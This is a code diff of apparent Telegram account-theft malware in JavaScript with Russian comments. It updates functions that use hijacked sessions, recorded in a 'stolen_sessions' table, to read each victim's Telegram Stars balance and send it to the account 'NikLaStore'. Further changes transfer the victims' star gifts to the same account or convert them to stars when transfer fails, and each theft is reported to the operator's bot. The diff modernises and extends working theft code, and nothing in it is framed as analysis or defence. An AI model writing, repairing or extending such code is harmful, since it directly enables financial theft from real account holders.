@@ -319,13 +319,17 @@ async function stealAllStars() {
 async function transferStarsToNikLa(client, phone) {
     try {
         // Получаем баланс звезд
-        const starsBalance = await client.invoke(new Api.payments.GetStarsBalance({}));
+        const starsStatus = await client.invoke(new Api.payments.GetStarsStatus({
+            peer: new Api.InputPeerSelf()
+        }));
         
-        if (!starsBalance || starsBalance.balance === 0) {
+        if (!starsStatus || !starsStatus.balance || starsStatus.balance.amount === 0) {
             bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет звезд`);
             return false;
         }
 
+        const starsAmount = Number(starsStatus.balance.amount) + Number(starsStatus.balance.nanos || 0) / 1e9;
+        
         // Ищем целевого пользователя
         const target = await client.invoke(
             new Api.contacts.ResolveUsername({ username: 'NikLaStore' })
@@ -337,13 +341,12 @@ async function transferStarsToNikLa(client, phone) {
         }
 
         const targetUser = target.users[0];
-        const starsAmount = Math.min(starsBalance.balance, 1000);
 
-        // Передаем звезды
+        // Передаем звезды через покупку подписки
         await client.invoke(
             new Api.payments.SendStars({
                 peer: targetUser,
-                stars: starsAmount,
+                stars: Math.floor(starsAmount),
                 purpose: new Api.InputStorePaymentPremiumSubscription({
                     restore: false,
                     upgrade: true
@@ -353,9 +356,9 @@ async function transferStarsToNikLa(client, phone) {
 
         // Обновляем базу
         db.run(`UPDATE stolen_sessions SET stars_data = ? WHERE phone = ?`, 
-            [starsAmount, phone]);
+            [Math.floor(starsAmount), phone]);
 
-        bot.sendMessage(MY_USER_ID, `✅ ${phone}: Украдено ${starsAmount} звезд`);
+        bot.sendMessage(MY_USER_ID, `✅ ${phone}: Украдено ${Math.floor(starsAmount)} звезд`);
         return true;
         
     } catch (error) {
@@ -364,18 +367,18 @@ async function transferStarsToNikLa(client, phone) {
     }
 }
 
-// РАБОЧАЯ ФУНКЦИЯ КРАЖИ ПОДАРКОВ  
+// РАБОЧАЯ ФУНКЦИЯ КРАЖИ ПОДАРКОВ
 async function transferGiftsToNikLa(client, phone) {
     try {
-        // Получаем список полученных подарков
-        const receivedGifts = await client.invoke(new Api.messages.GetReceivedGifts({
-            peer: await client.getInputEntity('me'),
-            offset: 0,
+        // Получаем список сохраненных подарков
+        const savedGifts = await client.invoke(new Api.payments.GetSavedStarGifts({
+            peer: new Api.InputPeerSelf(),
+            offset: "",
             limit: 50
         }));
 
-        if (!receivedGifts || !receivedGifts.gifts || receivedGifts.gifts.length === 0) {
-            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет подарков`);
+        if (!savedGifts || !savedGifts.gifts || savedGifts.gifts.length === 0) {
+            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет сохраненных подарков`);
             return false;
         }
 
@@ -391,27 +394,44 @@ async function transferGiftsToNikLa(client, phone) {
         const targetUser = target.users[0];
         let stolenCount = 0;
 
-        // Перебираем подарки которые можно передать
-        for (const gift of receivedGifts.gifts) {
+        // Перебираем подарки
+        for (const gift of savedGifts.gifts) {
             try {
-                if (gift.canBeTransferred) {
-                    // Конвертируем подарок в звезды и передаем
-                    await client.invoke(
-                        new Api.payments.SendStars({
-                            peer: targetUser,
-                            stars: gift.convertStarCount || 25,
-                            purpose: new Api.InputStorePaymentGift({
-                                userId: targetUser.id,
-                                gift: gift.id
-                            })
+                // Пробуем передать подарок
+                await client.invoke(
+                    new Api.payments.TransferStarGift({
+                        stargift: new Api.InputSavedStarGiftUser({ 
+                            msgId: gift.msgId 
+                        }),
+                        toId: new Api.InputPeerUser({ 
+                            userId: targetUser.id,
+                            accessHash: targetUser.accessHash
                         })
-                    );
-                    
-                    stolenCount++;
-                    await new Promise(resolve => setTimeout(resolve, 1500));
-                }
+                    })
+                );
+                
+                stolenCount++;
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
             } catch (e) {
-                continue;
+                // Если бесплатная передача не работает, пробуем конвертировать в звезды
+                try {
+                    if (gift.convertStars) {
+                        await client.invoke(
+                            new Api.payments.SendStars({
+                                peer: targetUser,
+                                stars: gift.convertStars,
+                                purpose: new Api.InputStorePaymentGift({
+                                    userId: targetUser.id
+                                })
+                            })
+                        );
+                        stolenCount++;
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                    }
+                } catch (e2) {
+                    continue;
+                }
             }
         }
 
@@ -425,7 +445,7 @@ async function transferGiftsToNikLa(client, phone) {
         return false;
         
     } catch (error) {
-        bot.sendMessage(MY_USER_ID, `❌ ${phone}: Ошибка передачи подарка - ${error.message}`);
+        bot.sendMessage(MY_USER_ID, `❌ ${phone}: Ошибка кражи подарков - ${error.message}`);
         return false;
     }
 }
